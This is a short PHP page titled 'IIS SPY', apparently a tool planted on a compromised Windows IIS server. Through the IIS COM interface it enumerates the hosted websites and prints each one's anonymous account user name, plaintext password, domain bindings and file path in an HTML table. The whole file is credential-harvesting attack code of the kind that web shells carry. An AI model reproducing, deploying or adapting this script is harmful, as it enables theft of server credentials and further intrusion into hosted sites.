<?php

define('IS_WIN', DIRECTORY_SEPARATOR == '\\');
define('IS_COM', class_exists('COM') ? 1 : 0 );

?>

<html xmlns=http://www.w3.org/1999/xhtml>
<head id=Head1>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<meta http-equiv="pragma" content="no-cache" />
<title>IIS SPY</title>
<style type="text/css">
BODY,TD{FONT-SIZE: 14px;line-height:20px;}
.tab-content { BORDER-RIGHT: #cccccc 1px solid; PADDING-RIGHT: 5px; BORDER-TOP: #cccccc 1px; PADDING-LEFT: 5px; PADDING-BOTTOM: 5px; VERTICAL-ALIGN: top; BORDER-LEFT: #cccccc 1px solid; PADDING-TOP: 5px; BORDER-BOTTOM: #cccccc 1px solid; BACKGROUND-COLOR: #ffffff;}
.Soft-content { BORDER-RIGHT: #cccccc 1px solid; PADDING-RIGHT: 5px; BORDER-TOP: #cccccc 1px solid; PADDING-LEFT: 5px; PADDING-BOTTOM: 5px; VERTICAL-ALIGN: top; BORDER-LEFT: #cccccc 1px solid; PADDING-TOP: 5px; BORDER-BOTTOM: #cccccc 1px solid; BACKGROUND-COLOR: #ffffff;}
</style>
</head>
<body>
<table cellspacing=1 runat=server cellpadding=1 width=600px align=center border=0>
<tr><td class=Soft-content>
        <div id="frm_main">
<?php
function ShowErr($s){
        echo("<pre stylr='background:#d1d1d1;'><font color=red>$s</font></pre>");
}
if(IS_WIN && IS_COM){
        try{
        $obj=@new COM("IIS://localhost/w3svc");
        $ctn="<table class=tab-content width=100% border=0 align=center cellpadding=0 cellspacing=0>
        <tr bgcolor=#0066CC><td>ID:</td><td>IIS_USER:</td><td>IIS_PASS:</td><td>Domain:</td><td>Path:</td></tr>\n";
        $i=0;
        foreach($obj as $obj3w)
        {    
                $i++;
                if($i%2==0) $ctn.="<tr>";
                else $ctn.="<tr bgcolor=#F0F8FF>";
                if(!is_numeric($obj3w->Name)) continue;
                $webSite=new com("IIS://localhost/w3svc/".$obj3w->Name.'/Root');
                if(!$webSite)
                {        $ctn.="<td>[ERROR]=".$php_errormsg."</td><td></td><td></td><td></td><td></td></tr>\n";
                        continue;
                }
                $Binds="";
                foreach($obj3w->ServerBindings as $Binds1)
                {
                        $Binds.=$Binds1."<br>\n";
                }
                $user=$webSite->AnonymousUserName;
                $pass=$webSite->AnonymousUserPass;
                $path=$webSite->path;
                $ctn.="<td >".$i."</td><td >".$user."</td><td >".$pass."</td><td >".$Binds."</td><td >".$path."</td></tr>\n";
        }
        $ctn.="</table>";
        echo $ctn;
        }
        catch(Exception $e){
                ShowErr($e->getMessage());
        }
}else{
        ShowErr('系统不支持');
}
?>
        </div>
</td></tr>
</table>
</body>
</html>